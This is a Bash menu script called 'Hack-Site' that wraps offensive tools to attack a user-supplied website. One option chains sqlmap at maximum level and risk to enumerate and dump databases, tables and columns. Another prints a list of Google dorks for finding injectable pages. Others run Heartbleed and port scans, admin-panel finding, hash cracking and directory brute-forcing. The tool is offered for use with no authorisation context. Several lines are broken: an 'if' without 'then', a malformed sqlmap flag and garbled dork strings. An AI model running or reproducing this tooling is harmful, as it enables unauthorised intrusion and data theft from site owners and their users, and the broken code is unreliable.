#!/bin/bash
clear
g='\e[1;32m'
c='\e[1;36m'
r='\e[1;31m'
b='\e[1;34m'
w='\e[1;37m'
y='\e[1;33m'

echo ""
echo ""
echo -e $w "------------------------------------------------"
echo -e $r '''_   _            _              ____  _ _
| | | | __ _  ___| | __         / ___|(_) |_ ___
| |_| |/ _` |/ __| |/ /  _____  \___ \| | __/ _ \
|  _  | (_| | (__|   <  |_____|  ___) | | ||  __/
|_| |_|\__,_|\___|_|\_\         |____/|_|\__\___|'''
echo ""
echo -e $g "          The Script By:$w Plus-X4 " 
echo -e $g "          Telegram:$w t.me/PlusX4"
echo -e $w "-\e[1;31mv2.3\e[1;37m-------------------------------------------"
echo ""
echo ""
echo -e $y "             [01]$w Sql-Injection "
echo -e $y "             [02]$w Find Admin-Panel"
echo -e $y "             [03]$w Decoding Hash"
echo -e $y "             [04]$w Info Website (IP,Country,...)"
echo -e $y "             [05]$w IP-GeoLocation"
echo -e $y "             [06]$w Dork (Sql)"
echo -e $y "             [07]$w Scanner Website"
echo -e $y "             [08]$w Scanner (Port)"
echo -e $y "             [09]$w Scanner (Heartbleed SSL) "
echo -e $y "             [10]$w Scanner (Sql-Injection) "
echo ""
echo -e $y "                [E]$r Exite"
echo -e $y "                [U]$r Update"
echo ""
echo -e $w
read -p " Enter The Numper )> " id

if [ $id = U ]
then 
bash Update.sh
fi

if [ $id = u ]
then 
bash Update.sh
fi

if [ $id = 1 ]
then
clear
echo ""
echo ""
echo ""
echo -e $r '''
 ____   ___  _       ___        _           _   _
/ ___| / _ \| |     |_ _|_ __  (_) ___  ___| |_(_) ___  _ __
\___ \| | | | |      | ||  _ \ | |/ _ \/ __| __| |/ _ \|  _ \
 ___) | |_| | |___   | || | | || |  __/ (__| |_| | (_) | | | |
|____/ \__\_\_____| |___|_| |_|/ |\___|\___|\__|_|\___/|_| |_|
                             |__/
'''
echo ""
echo ""
echo "" 
cd $HOME/Hack-Site/Modules/.sqlmap/sqlmap
echo -e $g
read -p "[+] Enter The Website ^> " site
python2 sqlmap.py -u $site --dbs s--  level=3 --risk=3 --batch
echo -e $g
read -p "[+] Enter The Name Database ^> " database
python2 sqlmap.py -u $site -D $database --tables --level=3 --risk=3 --batch
echo -e $g
read -p "[+] Enter The Name Table ^> " table
python2 sqlmap.py -u $site -D $database -T $table --columns --level=3 --risk=3 --batch
echo -e $g
read -p "[+] Enter The Name Column ^> " column
python2 sqlmap.py -u $site -D $database -T $table -C $column --dump --level=3 --risk=3 --batch
echo ""
echo -e $r ""
read -p "Done...Press Enter To Back "
cd $HOME/Hack-Site/
bash Hack-Site.sh
fi
if [ $id = 2 ]
then
clear
cd $HOME/Hack-Site/Modules/.admin-panel
python2 admin-panel.py
echo -e $r ""
read -p "Done...Press Enter To Back "
cd $HOME/Hack-Site/
bash Hack-Site.sh
fi

if [ $id = 3 ]
then
clear
cd $HOME/Hack-Site/Modules/.hash
python2 hash.py
echo -e $r ""
read -p "Done...Press Enter To Back "
cd $HOME/Hack-Site/
bash Hack-Site.sh
fi

if [ $id = 4 ]
then
echo ""
read -p "[+] Enter The Website ^> " Cc
echo ""
curl http://ip-api.com/$Cc
echo -e $r ""
read -p "Done...Press Enter To Back "
cd $HOME/Hack-Site/
bash Hack-Site.sh
fi

if [ $id = 5 ]
then
clear
echo ""
echo ""
echo -e $r '''
 ___ ____     ____            _                    _   _
|_ _|  _ \   / ___| ___  ___ | |    ___   ___ __ _| |_(_)
 | || |_) | | |  _ / _ \/ _ \| |   / _ \ / __/ _` | __| |
 | ||  __/  | |_| |  __/ (_) | |__| (_) | (_| (_| | |_| |
|___|_|      \____|\___|\___/|_____\___/ \___\__,_|\__|_|
'''
echo ""
echo
echo -e $g
read -p "Enter IP ^> " Kk
echo -e $w ""
cd $HOME/Hack-Site/Modules/.IPGeoLocation
python3 ipgeolocation.py -t $Kk
echo -e $r ""
read -p "Done...Press Enter For Back "
cd $HOME/Hack-Site/
bash Hack-Site.sh
fi

if [ $id = 6 ]
then
echo -e $r '''
   ____             _
  |  _ \  ___  _ __| | __
  | | | |/ _ \| `__| |/ /
  | |_| | (_) | |  |   <
  |____/ \___/|_|  |_|\_\ 
'''
echo -e $g "[+]$w inurl:trainers.php?id="
echo -e $g "[+]$w inurl:buy.php?category="
echo -e $g "[+]$w inurl:article.php?ID="
echo -e $g "[+]$w inurllay_old.php?id="
echo -e $g "[+]$w inurl:declaration_more.php?decl_id="
echo -e $g "[+]$w inurlageid="
echo -e $g "[+]$w ld.php?id="
echo -e $g "[+]$w inurl:declaration_more.php?decl_id="
echo -e $g "[+]$w inurlageid="
echo -e $g "[+]$w inurl:games.php?id="
echo -e $g "[+]$w inurlage.php?file="
echo -e $g "[+]$w inurl:newsDetail.php?id="
echo -e $g "[+]$w inurl:gallery.php?id="
echo -e $g "[+]$w inurl:article.php?id="
echo -e $g "[+]$w inurl:show.php?id="
echo -e $g "[+]$w inurl:staff_id="
echo -e $g "[+]$w inurl:newsitem.php?num="
echo -e $g "[+]$w inurl:readnews.php?id="
echo -e $g "[+]$w inurl:top10.php?cat="
echo -e $g "[+]$w inurl:historialeer.php?num="
echo -e $g "[+]$w inurl:reagir.php?num="
echo -e $g "[+]$w inurl:Stray-Questions-View.php?num="
echo -e $g "[+]$w inurl:forum_bds.php?num="
echo -e $g "[+]$w inurl:game.php?id="
echo -e $g "[+]$w inurl:index.php?id="
echo -e $g "[+]$w inurl:trainers.php?id="
echo -e $g "[+]$w inurl:buy.php?category="
echo -e $g "[+]$w inurl:article.php?ID="
echo -e $g "[+]$w inurllay_oinurl:view_product.php?id="
echo -e $g "[+]$w inurl:newsone.php?id="
echo -e $g "[+]$w inurl:sw_comment.php?id="
echo -e $g "[+]$w inurl:news.php?id="
echo -e $g "[+]$w inurl:avd_start.php?avd="
echo -e $g "[+]$w inurl:event.php?id="
echo -e $g "[+]$w inurlroduct-item.php?id="
echo -e $g "[+]$w inurl:sql.php?id="
echo -e $g "[+]$w inurl:news_view.php?id="
echo -e $g "[+]$w inurl:select_biblio.php?id="
echo -e $g "[+]$w inurl:humor.php?id="
echo -e $g "[+]$w inurl:aboutbook.php?id="
echo -e $g "[+]$w inurlgl_inet.php?ogl_id="
echo -e $g "[+]$w inurl:fiche_spectacle.php?id="
echo -e $r ""
read -p "Done... Press Enter To Back "
cd $HOME/Hack-Site/
bash Hack-Site.sh
fi

if [ $id = 7 ]
then
clear
echo ""
echo ""
echo -e $r '''
 ___                             __      __   _       _ _
/ __| __ __ _ _ _  _ _  ___ _ _  \ \    / /__| |__ __(_) |_ ___
\__ \/ _/ _` | ` \| ` \/ -_) `_|  \ \/\/ / -_) `_ (_-< |  _/ -_)
|___/\__\__,_|_||_|_||_\___|_|     \_/\_/\___|_.__/__/_|\__\___|
'''
echo ""
echo ""
echo -e $g ""
read -p "[+] Enter The WebSite ^> " Tt
echo -e $r
echo -e $y
read -p "[!] Do you Scanner By angryFuzzer (y/n) " a1
read -p "[!] Do you Scanner By nikto (y/n) " a2
read -p "[!] Do you Scanner By dirsearch (y/n) " a3
read -p "[!] Do You Scanner By gasmask (y/n) " a4
echo
echo
echo
if [ $a1 = y ]
then
echo -e $y "[!] Start Scanner By angryFuzzer..."
sleep 5
cd $HOME/Hack-Site/Modules/.angryFuzzer
python2 angryFuzzer.py -u $Tt
echo -e $w ""
read -p "Done...Press Enter "
fi
if [ $a2 = y ]
then
echo -e $w ""
echo -e $y "[!] Start Scanner By Nikto..."
sleep 5
cd $HOME/Hack-Site/Modules/.nikto/program
perl nikto.pl -h $Tt
echo -e $w ""
echo -e $r ""
read -p "Done...Press Enter "
fi
if [ $a3 = y ]
then
echo -e $w ""
echo -e $y "[!] Start Scanner By Dirsearch..."
sleep 5
cd $HOME/Hack-Site/Modules/.dirsearch 
python3 dirsearch.py -u $Tt
echo -e $w ""
read -p "Done...Press Enter "
fi
if [ $a4 = y ]
then 
echo -e $w ""
echo -e $y "[!] Start Scanner By Gasmask..."
sleep 5
cd $HOME/Hack-Site/Modules/.gasmask
python2 gasmask.py -d $Tt
echo -e $w ""
read -p "Done...Press Enter "
fi
cd $HOME/Hack-Site
bash Hack-Site.sh
fi
if [ $id = 8 ]
then
echo -e $g ""
read -p "[+] Enter The WebSite ^> " Ff
echo -e $w ""
curl http://api.hackertarget.com/nmap/?q=$Ff
echo -e $r ""
read -p "Done...Press Enter To Back "
cd $HOME/Hack-Site/
bash Hack-Site.sh
fi

if [ $id = 9 ]
then
echo -e $g ""
read -p "[+] Enter The WebSite ^> " Uu
echo -e $w ""
nmap -sV -p 443 --script=ssl-heartbleed $Uu
echo -e $r ""
read -p "Done...Press Enter To Back "
cd $HOME/Hack-Site/
bash Hack-Site.sh
fi

if [ $id = 10 ]
cd $HOME/Hack-Site/Modules/.slq
php sql.php
fi

if [ $id = e ]
then
echo ""
echo -e $r "            Good Bye........"
echo -e $w
fi

if [ $id = E ]
then
echo ""
echo -e $r "            Good Bye........"
echo -e $w
fi
